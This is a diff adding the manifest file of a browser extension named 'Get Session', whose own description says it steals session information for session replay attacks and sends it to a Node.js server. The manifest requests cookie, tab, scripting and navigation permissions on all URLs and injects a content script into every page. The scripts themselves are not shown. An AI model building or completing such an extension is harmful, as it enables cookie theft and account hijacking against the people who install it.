@@ -1,0 +1,21 @@
+{
+    "manifest_version": 3,
+    "name": "Get Session",
+    "description": "Steals session information used to perform session replay attacks and sends info to a Node.js server!",
+    "version": "1.0",
+    "permissions": [
+        "storage", "activeTab", "tabs", "cookies", "scripting", "webNavigation"
+    ],
+    "background": {
+        "service_worker": "background.js"
+    },
+    "host_permissions": [
+        "*://*/*"
+    ],
+    "content_scripts": [
+        {
+        "matches": ["<all_urls>"],
+        "js": ["content.js"]
+        }
+    ]
+}
